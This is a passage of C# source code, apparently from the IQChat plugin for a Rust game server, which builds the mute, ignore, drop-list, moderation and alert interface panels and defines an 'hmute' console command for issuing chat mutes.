                    new CuiInputFieldComponent { Text = SearchName, FontSize = 14,Command = $"newui.cmd action.mute.ignore search.controller %ACTION_TYPE% {SearchName}", Align = TextAnchor.MiddleCenter, Color = "1 1 1 0.5", CharsLimit = 15},
                    new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "PanelPages",
                    Parent = "MuteAndIgnoredPanel",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_MUTE_AND_IGNORE_PAGE_PANEL")},
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-179.196 161.242", OffsetMax = "-121.119 192.578" }
                }
                });

                AddInterface("UI_Chat_Mute_And_Ignore", container.ToJson());
            }
		   		 		  						  	   		  	  			  	  			  	   		  		  
            private void BuildingMuteAndIgnorePlayerPanel()
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiPanel
                {
                    CursorEnabled = true,
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0.85" },
                    Image = { Color = "0 0 0 0" }
                }, "MuteAndIgnoredPanel", "MuteIgnorePanelContent");

                AddInterface("UI_Chat_Mute_And_Ignore_Panel_Content", container.ToJson());
            }         
            private void BuildingMuteAndIgnorePlayer()
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiElement
                {
                    Name = "PANEL_PLAYER",
                    Parent = "MuteIgnorePanelContent",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_MUTE_AND_IGNORE_PLAYER") }, 
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "%OFFSET_MIN%", OffsetMax = "%OFFSET_MAX%" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "NickName",
                    Parent = "PANEL_PLAYER", 
                    Components = {
                    new CuiTextComponent { Text = "%DISPLAY_NAME%", Font = "robotocondensed-regular.ttf", FontSize = 12, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-77.391 -17.245", OffsetMax = "91.582 17.244" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "StatusPanel",
                    Parent = "PANEL_PLAYER",
                    Components = {
                    new CuiRawImageComponent { Color = "%COLOR%", Png = ImageUi.GetImage("IQCHAT_MUTE_AND_IGNORE_PLAYER_STATUS") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-92.231 -11.655", OffsetMax = "-87.503 10.44" }
                }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = "%COMMAND_ACTION%", Color = "0 0 0 0" },
                    Text = { Text = "" }
                }, "PANEL_PLAYER");

                AddInterface("UI_Chat_Mute_And_Ignore_Player", container.ToJson());
            }           
            private void BuildingMuteAndIgnorePages()
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiElement
                {
                    Name = "PageCount",
                    Parent = "PanelPages",
                    Components = {
                    new CuiTextComponent { Text = "%PAGE%", Font = "robotocondensed-regular.ttf", FontSize = 14, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-11.03 -15.668", OffsetMax = "11.03 15.668" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "LeftPage",
                    Parent = "PanelPages",
                    Components = {
                    new CuiRawImageComponent { Color = "%COLOR_LEFT%", Png = ImageUi.GetImage("IQCHAT_ELEMENT_SLIDER_LEFT_ICON") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-18 -7", OffsetMax = "-13 6" }
                }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = "%COMMAND_LEFT%", Color = "0 0 0 0" },
                    Text = { Text = "" }
                },  "LeftPage");

                container.Add(new CuiElement
                {
                    Name = "RightPage",
                    Parent = "PanelPages",
                    Components = {
                    new CuiRawImageComponent { Color = "%COLOR_RIGHT%", Png = ImageUi.GetImage("IQCHAT_ELEMENT_SLIDER_RIGHT_ICON") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "14 -7", OffsetMax = "19 6" }
                }
                });
		   		 		  						  	   		  	  			  	  			  	   		  		  
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = "%COMMAND_RIGHT%", Color = "0 0 0 0" },
                    Text = { Text = "" }
                }, "RightPage");
		   		 		  						  	   		  	  			  	  			  	   		  		  
                AddInterface("UI_Chat_Mute_And_Ignore_Pages", container.ToJson());
            }

            
                        private void BuildingMuteAndIgnorePanelAlert()
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiPanel
                {
                    CursorEnabled = true,
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Image = { Color = "0 0 0 0.25", Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" }
                }, "Overlay", "MUTE_AND_IGNORE_PANEL_ALERT");

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Close = "MUTE_AND_IGNORE_PANEL_ALERT", Color = "0 0 0 0" },
                    Text = { Text = "" }
                }, "MUTE_AND_IGNORE_PANEL_ALERT");

                AddInterface("UI_Chat_Mute_And_Ignore_Alert_Panel", container.ToJson());
            }        
		   		 		  						  	   		  	  			  	  			  	   		  		  
            
            private void BuildingMuteAlert()
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiElement
                {
                    Name = "AlertMute",
                    Parent = "MUTE_AND_IGNORE_PANEL_ALERT",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_MUTE_ALERT_PANEL") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-199.832 -274.669", OffsetMax = "199.832 274.669" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "AlertMuteIcon",
                    Parent = "AlertMute",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_MUTE_ALERT_ICON") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-67 204.8", OffsetMax = "67 339.8" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "AlertMuteTitles",
                    Parent = "AlertMute", 
                    Components = {
                    new CuiTextComponent { Text = "%TITLE%", Font = "robotocondensed-regular.ttf", FontSize = 25, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-199.828 142.57", OffsetMax = "199.832 179.43" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "AlertMuteTakeChat",
                    Parent = "AlertMute",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1",Png = ImageUi.GetImage("IQCHAT_IGNORE_ALERT_BUTTON_YES") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-99.998 87.944", OffsetMax = "100.002 117.944" }
                }
                });
                
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = "%COMMAND_TAKE_ACTION_MUTE_CHAT%", Color = "0 0 0 0" },
                    Text = { Text = "%BUTTON_TAKE_CHAT_ACTION%", Align = TextAnchor.MiddleCenter, FontSize = 18, Color = "0.1294118 0.145098 0.1647059 1" }
                }, "AlertMuteTakeChat", "BUTTON_TAKE_CHAT");
		   		 		  						  	   		  	  			  	  			  	   		  		  
                container.Add(new CuiElement
                {
                    Name = "AlertMuteTakeVoice",
                    Parent = "AlertMute",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1",Png = ImageUi.GetImage("IQCHAT_IGNORE_ALERT_BUTTON_YES") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-100 49.70", OffsetMax = "100 79.70" } //
                }
                });
                
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = "%COMMAND_TAKE_ACTION_MUTE_VOICE%", Color = "0 0 0 0" },
                    Text = { Text = "%BUTTON_TAKE_VOICE_ACTION%", Align = TextAnchor.MiddleCenter, FontSize = 18, Color = "0.1294118 0.145098 0.1647059 1" }
                }, "AlertMuteTakeVoice", "BUTTON_TAKE_VOICE");

                AddInterface("UI_Chat_Mute_Alert", container.ToJson());
            }
            private void BuildingMuteAlert_DropList_Title()
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiElement
                {
                    Name = "AlertMuteTitleReason",
                    Parent = "AlertMute",
                    Components = {
                    new CuiTextComponent { Text = "%TITLE%", Font = "robotocondensed-regular.ttf", FontSize = 22, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-199.828 -9.430", OffsetMax = "199.832 27.430" }
                }
                });

                container.Add(new CuiPanel
                {
                    CursorEnabled = false,
                    Image = { Color = "1 1 1 0" },
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-147.497 -265.5440", OffsetMax = "147.503 -24.70" }
                }, "AlertMute", "PanelMuteReason");

                AddInterface("UI_Chat_Mute_Alert_DropList_Title", container.ToJson());
            }

            private void BuildingMuteAlert_DropList_Reason()
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiElement
                {
                    Name = "Reason",
                    Parent = "PanelMuteReason",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_MUTE_ALERT_PANEL_REASON")},
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "%OFFSET_MIN%", OffsetMax = "%OFFSET_MAX%" } 
                }
                });
		   		 		  						  	   		  	  			  	  			  	   		  		  
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = "%COMMAND_REASON%", Color = "0 0 0 0" },
                    Text = { Text = "%REASON%", Align = TextAnchor.MiddleCenter, FontSize = 13, Color = "1 1 1 1" }
                },  "Reason");

                AddInterface("UI_Chat_Mute_Alert_DropList_Reason", container.ToJson());
            }
            
                        private void BuildingIgnoreAlert()
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiElement
                {
                    Name = "AlertIgnore",
                    Parent = "MUTE_AND_IGNORE_PANEL_ALERT",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_IGNORE_ALERT_PANEL") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-236.5 -134", OffsetMax = "236.5 134" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "AlertIgnoreIcon",
                    Parent = "AlertIgnore",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_IGNORE_ALERT_ICON") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-66.5 64.8", OffsetMax = "66.5 198.8" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "AlertIgnoreTitle",
                    Parent = "AlertIgnore",
                    Components = {
                    new CuiTextComponent { Text = "%TITLE%", Font = "robotocondensed-regular.ttf", FontSize = 22, Align = TextAnchor.UpperCenter, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-231 -55.00", OffsetMax = "229.421 33.984449" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "AlertIgnoreYes",
                    Parent = "AlertIgnore",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_IGNORE_ALERT_BUTTON_YES") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-178 -115", OffsetMax = "-22 -77" }
                }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1"},
                    Button = { Close = "MUTE_AND_IGNORE_PANEL_ALERT", Command = "%COMMAND%", Color = "0 0 0 0" },
                    Text = {  Text = "%BUTTON_YES%", Align = TextAnchor.MiddleCenter, FontSize = 18, Color = "0.1294118 0.145098 0.1647059 1" }
                },  "AlertIgnoreYes", "BUTTON_YES");

                container.Add(new CuiElement
                {
                    Name = "AlertIgnoreNo",
                    Parent = "AlertIgnore",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_IGNORE_ALERT_BUTTON_NO") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "22 -115", OffsetMax = "178 -77" }
                }
                });
		   		 		  						  	   		  	  			  	  			  	   		  		  
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Close = "MUTE_AND_IGNORE_PANEL_ALERT", Color = "0 0 0 0" },
                    Text = { Text = "%BUTTON_NO%", Align = TextAnchor.MiddleCenter, FontSize = 18 }
                }, "AlertIgnoreNo", "BUTTON_NO");

                AddInterface("UI_Chat_Ignore_Alert", container.ToJson());
            }
            
            
            
            
            private void BuildingDropList()
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiElement
                {
                    Name = "DropListIcon",
                    Parent = UI_Chat_Context,
                    Components = {
                            new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_ELEMENT_PREFIX_MULTI_TAKE_ICON")},
                      new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "%OFFSET_MIN%", OffsetMax = "%OFFSET_MAX%" }
                        }
                });
		   		 		  						  	   		  	  			  	  			  	   		  		  
                container.Add(new CuiElement
                {
                    Name = "DropListDescription",
                    Parent = "DropListIcon",
                    Components = {
                            new CuiTextComponent { Text = "%TITLE%", Font = "robotocondensed-regular.ttf", FontSize = 8, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                            new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-105.5 -13.948", OffsetMax = "-42.615 1.725" }
                        }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = "%BUTTON_DROP_LIST_CMD%", Color = "0 0 0 0" },
                    Text = { Text = "" }
                }, "DropListIcon", "DropListIcon_Button");
                
                AddInterface("UI_Chat_DropList", container.ToJson());
            }
		   		 		  						  	   		  	  			  	  			  	   		  		  
            private void BuildingOpenDropList()
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiElement
                {
                    Name = "OpenDropList",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_ELEMENT_DROP_LIST_OPEN_ICON")},
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-149.429 -17.38", OffsetMax = "155.093 109.1" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "DropListName",
                    Parent = "OpenDropList",
                    Components = {
                    new CuiTextComponent { Text = "%TITLE%", Font = "robotocondensed-regular.ttf", FontSize = 11, Align = TextAnchor.UpperLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-140.329 44.5", OffsetMax = "-40.329 58.312" }
                }
                });

                container.Add(new CuiElement 
                {
                    Name = "DropListDescription",
                    Parent = "OpenDropList",
                    Components = {
                    new CuiTextComponent { Text = "%DESCRIPTION%", Font = "robotocondensed-regular.ttf", FontSize = 8, Align = TextAnchor.UpperLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-140.329 32.993", OffsetMax = "-40.329 42.77" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "DropListClose",
                    Parent = "OpenDropList",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_ELEMENT_PREFIX_MULTI_TAKE_ICON") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "113 32.2", OffsetMax = "145 56.2" }
                }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1"},
                    Button = { Close = "OpenDropList", Color ="0 0 0 0" },
                    Text = {  Text = "" }
                }, "DropListClose", "DropListClose_Button");

                container.Add(new CuiElement
                {
                    Name = "DropListPageRight",
                    Parent = "OpenDropList",
                    Components = {
                    new CuiRawImageComponent { Color = "%COLOR_RIGHT%", Png = ImageUi.GetImage("IQCHAT_ELEMENT_SLIDER_RIGHT_ICON") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "100 38", OffsetMax = "105.2 48" }
                }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = "%NEXT_BTN%", Color = "0 0 0 0" },
                    Text = { Text = "" }
                }, "DropListPageRight", "DropListPageRight_Button"); 

                container.Add(new CuiElement
                {
                    Name = "DropListPageLeft",
                    Parent = "OpenDropList", 
                    Components = {
                    new CuiRawImageComponent { Color ="%COLOR_LEFT%", Png = ImageUi.GetImage("IQCHAT_ELEMENT_SLIDER_LEFT_ICON") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "86 38", OffsetMax = "91.2 48" }
                }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = "%BACK_BTN%", Color = "0 0 0 0" },
                    Text = { Text = "" }
                }, "DropListPageLeft", "DropListPageLeft_Button");

                AddInterface("UI_Chat_OpenDropList", container.ToJson());
            }

            private void BuildingElementDropList()
            {
                CuiElementContainer container = new CuiElementContainer();
                String Name = "ArgumentDropList_%COUNT%";

                container.Add(new CuiElement
                {
                    Name = Name,
                    Parent = "OpenDropList",
                    Components = {
                    new CuiRawImageComponent { FadeIn = 0.3f, Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_ELEMENT_DROP_LIST_OPEN_ARGUMENT_ICON") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "%OFFSET_MIN%", OffsetMax = "%OFFSET_MAX%" }
                }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-37.529 -12.843", OffsetMax = "37.528 12.842" },
                    Button = { FadeIn = 0.3f, Command = "%TAKE_COMMAND_ARGUMENT%", Color = "0 0 0 0" },
                    Text = { FadeIn = 0.3f, Text = "%ARGUMENT%", Font = "robotocondensed-regular.ttf", FontSize = 9, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" }
                },  Name, "ArgumentButton");

                AddInterface("UI_Chat_OpenDropListArgument", container.ToJson());
            }
                   
            private void BuildingElementDropListTakeLine()
            {
                CuiElementContainer container = new CuiElementContainer();
                String Parent = "ArgumentDropList_%COUNT%";

                container.Add(new CuiElement
                {
                    Name = "TAKED_INFO_%COUNT%",
                    Parent = Parent,
                    Components = {
                    new CuiRawImageComponent { Color = "0.3098039 0.2745098 0.572549 1", Png = ImageUi.GetImage("IQCHAT_ELEMENT_DROP_LIST_OPEN_TAKED") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-25.404 -17.357", OffsetMax = "25.403 -1.584" }
                }
                });

                AddInterface("UI_Chat_OpenDropListArgument_Taked", container.ToJson());
            }
		   		 		  						  	   		  	  			  	  			  	   		  		  
            
                        private void BuildingModerationStatic()
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiElement
                {
                    Name = "ModerationLabel",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%TITLE%", Font = "robotocondensed-regular.ttf", FontSize = 8, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "11.075 -126.612", OffsetMax = "126.125 -112.988" } 
                }
                });

                container.Add(new CuiElement
                {
                    Name = "ModerationIcon",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_MODERATION_ICON") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "141.88 -125.3", OffsetMax = "152.88 -114.3" }
                }
                });


                container.Add(new CuiElement
                {
                    Name = "ModeratorMuteMenu",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_ELEMENT_PANEL_ICON")},
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "11.071 -144.188", OffsetMax = "152.881 -129.752" } 
                }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0.95" },
                    Button = { Command = "%COMMAND_MUTE_MENU%", Color = "0 0 0 0" }, 
                    Text = { Text = "%TEXT_MUTE_MENU%", FontSize = 9, Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf" }
                }, "ModeratorMuteMenu", "ModeratorMuteMenu_Btn");


                AddInterface("UI_Chat_Moderation", container.ToJson());
            }
            private void BuildingMuteAllChat()
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiElement
                {
                    Name = "ModeratorMuteAllChat",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_ELEMENT_PANEL_ICON") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "11.07 -161.818", OffsetMax = "152.88 -147.382" }  
                }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0.95" },
                    Button = { Command = "%COMMAND_MUTE_ALLCHAT%", Color = "0 0 0 0" }, 
                    Text = { Text = "%TEXT_MUTE_ALLCHAT%", FontSize = 9, Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf" }
                }, "ModeratorMuteAllChat", "ModeratorMuteAllChat_Btn");
		   		 		  						  	   		  	  			  	  			  	   		  		  
                AddInterface("UI_Chat_Administation_AllChat", container.ToJson());
            }
            private void BuildingMuteAllVoice() 
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiElement
                {
                    Name = "ModeratorMuteAllVoice",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_ELEMENT_PANEL_ICON") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "11.075 -179.448", OffsetMax = "152.885 -165.012" }
                }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0.95" },
                    Button = { Command = "%COMMAND_MUTE_ALLVOICE%", Color = "0 0 0 0" }, 
                    Text = { Text = "%TEXT_MUTE_ALLVOICE%", FontSize = 9, Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf" }
                }, "ModeratorMuteAllVoice", "ModeratorMuteAllVoice_Btn");

                AddInterface("UI_Chat_Administation_AllVoce", container.ToJson());
            }

            
            
                        private void BuildingAlertUI()
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiElement 
                {
                    Name = UI_Chat_Alert,
                    Parent = "Overlay",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_ALERT_PANEL") },
                    new CuiRectTransformComponent { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "0 -136.5", OffsetMax = "434 -51.5" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "AlertTitle",
                    Parent = UI_Chat_Alert,
                    Components = {
                    new CuiTextComponent { Text = "<b>%TITLE%</b>", Font = "robotocondensed-bold.ttf", FontSize = 16, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-184.193 9.119", OffsetMax = "189.223 30.925" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "AlertText",
                    Parent = UI_Chat_Alert,
                    Components = {
                    new CuiTextComponent { Text = "%DESCRIPTION%", Font = "robotocondensed-regular.ttf", FontSize = 12, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-184.193 -27.133", OffsetMax = "189.223 9.119" }  
                }
                });

                AddInterface("UI_Chat_Alert", container.ToJson());
            }
                    }

        
        private BasePlayer GetPlayerNickOrID(String Info)
        {
            String NameOrID = String.Empty;

            KeyValuePair<UInt64, GeneralInformation.RenameInfo> RenameInformation = GeneralInfo.RenameList.FirstOrDefault(x => x.Value.RenameNick.Contains(Info) || x.Value.RenameID.ToString() == Info);
            if (RenameInformation.Value == null)
                NameOrID = Info;
            else NameOrID = RenameInformation.Key.ToString();

            foreach (BasePlayer Finder in BasePlayer.activePlayerList)
            {
                if (Finder.displayName.ToLower().Contains(NameOrID.ToLower()) || Finder.userID.ToString() == NameOrID)
                    return Finder;
            }

            return null;
        }

        private static IQChat _;

        void OnUserGroupAdded(string id, string groupName)
        {
            String[] PermissionsGroup = permission.GetGroupPermissions(groupName);
            if (PermissionsGroup == null) return;
            foreach (String permName in PermissionsGroup)
                SetupParametres(id, permName);
        }

        [ConsoleCommand("hmute")]
        void HideMuteConsole(ConsoleSystem.Arg arg)
        {
            if (arg.Player() != null)
                if (!permission.UserHasPermission(arg.Player().UserIDString, PermissionMute)) return;

            if (arg == null || arg.Args == null || arg.Args.Length != 3 || arg.Args.Length > 3)
            {
                ConsoleOrPrintMessage(arg.Player(),
                    LanguageEn
                        ? "Invalid syntax, use : hmute Steam64ID Reason Time (seconds)"
                        : "Неверный синтаксис,используйте : hmute Steam64ID Причина Время(секунды)");
                return;
            }
            string NameOrID = arg.Args[0];
            string Reason = arg.Args[1];
            Int32 TimeMute = 0;
            if (!Int32.TryParse(arg.Args[2], out TimeMute))
            {
                ConsoleOrPrintMessage(arg.Player(),
                    LanguageEn ? "Enter the time in numbers!" : "Введите время цифрами!");
                return;
            }
            BasePlayer target = GetPlayerNickOrID(NameOrID);
            if (target == null)
            {
                UInt64 Steam64ID = 0;
                if (UInt64.TryParse(NameOrID, out Steam64ID))
                {
                    if(UserInformation.ContainsKey(Steam64ID))
                    {
                        User Info = UserInformation[Steam64ID];
                        if (Info == null) return;
                        if (Info.MuteInfo.IsMute(MuteType.Chat))
                        {
                            ConsoleOrPrintMessage(arg.Player(),
                                LanguageEn ?"The player already has a chat lock" : "Игрок уже имеет блокировку чата");
                            return;
                        }
                        
                        Info.MuteInfo.SetMute(MuteType.Chat, TimeMute);
                        
                        ConsoleOrPrintMessage(arg.Player(),
                            LanguageEn ? "Chat blocking issued to offline player" : "Блокировка чата выдана offline-игроку");
                        return;
                    }
                    else
                    {
                        ConsoleOrPrintMessage(arg.Player(),
                            LanguageEn ? "This player is not on the server" : "Такого игрока нет на сервере");
                        return;
                    }
                }
                else
                {
                    ConsoleOrPrintMessage(arg.Player(),
                        LanguageEn ? "This player is not on the server" : "Такого игрока нет на сервере");
                    return;
                }
            }

            MutePlayer(target, MuteType.Chat, 0, arg.Player(), Reason, TimeMute, true, true);
        }
        public void AnwserMessage(BasePlayer player, String Message)
        {
            Configuration.AnswerMessage Anwser = config.AnswerMessages;
            if (!Anwser.UseAnswer) return;
            foreach (KeyValuePair<String, Configuration.LanguageController> Anwsers in Anwser.AnswerMessageList)
                if (Message.Contains(Anwsers.Key.ToLower()))
                    ReplySystem(player, GetMessages(player, Anwsers.Value.LanguageMessages));
        }
        private const String PermissionAntiSpam = "iqchat.antispamabuse";
        public bool IsFake(UInt64 userID)
        {
            if (!IQFakeActive) return false;
            return (bool)IQFakeActive?.Call("IsFake", userID);
        }
        void API_SEND_PLAYER_CONNECTED(BasePlayer player, String DisplayName, String country, String userID)
        {
            Configuration.ControllerAlert.PlayerSession AlertSessionPlayer = config.ControllerAlertSetting.PlayerSessionSetting;

            if (AlertSessionPlayer.ConnectedAlert)
            {
